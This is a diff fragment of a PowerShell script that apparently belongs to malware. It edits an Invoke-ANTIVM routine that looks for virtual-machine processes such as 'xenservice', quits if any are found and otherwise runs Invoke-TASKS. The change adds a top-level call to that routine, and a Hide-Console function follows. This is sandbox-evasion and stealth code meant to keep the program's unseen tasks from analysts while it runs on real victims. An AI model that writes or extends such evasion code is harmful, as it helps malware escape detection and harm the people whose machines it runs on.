@@ -511,24 +511,19 @@ function Invoke-ANTIVM {
             "xenservice"
         )
     }
-    
     $processnames = antivm
     $detectedProcesses = $processnames | ForEach-Object {
-        $processName = $_
-        if (Get-Process -Name $processName -ErrorAction SilentlyContinue) {
-            $processName
-        }
-    }
-
+    $processName = $_
+    if (Get-Process -Name $processName) {$processName}}
     if ($null -eq $detectedProcesses) { 
-        Invoke-TASKS
+	   Invoke-TASKS
     }
     else { 
-        Write-Output "Detected processes: $($detectedProcesses -join ', ')"
-        Exit
+      Write-Output "Detected processes: $($detectedProcesses -join ', ')"
+      Exit
     }
 }
-
+Invoke-ANTIVM
 
 function Hide-Console
 {
